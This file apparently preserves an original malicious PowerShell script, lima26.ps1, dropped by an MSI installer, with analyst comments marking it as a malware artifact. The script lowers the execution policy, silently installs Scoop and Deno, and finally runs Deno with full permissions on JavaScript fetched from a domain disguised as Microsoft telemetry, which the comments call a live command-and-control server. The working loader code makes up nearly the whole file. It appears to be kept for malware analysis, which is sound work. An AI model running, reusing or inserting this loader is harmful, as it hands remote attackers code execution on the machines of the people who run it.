# ===================================================================
# ⚠️ MALICIOUS ARTIFACT — DO NOT EXECUTE
# ===================================================================
# This is the ORIGINAL PowerShell script from the MSI installer.
# It installs Deno via Scoop/WinGet and launches the Stage 2 malware.
#
# Source: Dropped by MSI to %LOCALAPPDATA%\<name>\lima26.ps1
# File: lima26.ps1 (1537 bytes)
# ===================================================================

try { Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force } catch {}

$h = Join-Path $env:USERPROFILE 'scoop\shims'
if ($env:Path -notlike "*$h*") { $env:Path = "$h;$env:Path" }

if (-not (Get-Command winget -ErrorAction SilentlyContinue)) {
    if (-not (Get-Command scoop -ErrorAction SilentlyContinue)) {
        $a = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if ($a) {
            iex "& {$(irm get.scoop.sh)} -RunAsAdmin"
        } else {
            irm get.scoop.sh | iex
        }
    }
    scoop install winget
}

if (-not (Get-Command deno -ErrorAction SilentlyContinue)) {
    winget install --id DenoLand.Deno -e --accept-source-agreements --accept-package-agreements --silent 2>$null
}

$deno = (Get-Command deno -ErrorAction SilentlyContinue).Source
if (-not $deno) {
    $deno = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\WinGet\Packages" -Filter deno.exe -Recurse -EA 0 | Select-Object -First 1 -ExpandProperty FullName
}
if (-not $deno) {
    $deno = Get-ChildItem "$env:USERPROFILE\scoop" -Filter deno.exe -Recurse -EA 0 | Select-Object -First 1 -ExpandProperty FullName
}
if (-not $deno) {
    if (Get-Command scoop -ErrorAction SilentlyContinue) {
        scoop install deno
        $env:Path = "$env:USERPROFILE\scoop\shims;$env:Path"
        $deno = (Get-Command deno -ErrorAction SilentlyContinue).Source
    }
}

# ⚠️ THIS LINE EXECUTES THE MALWARE — connects to live C2 server
& $deno -A "http://ms-telemetry-gateway-us.com/acca66ea4f9f6efe.js"
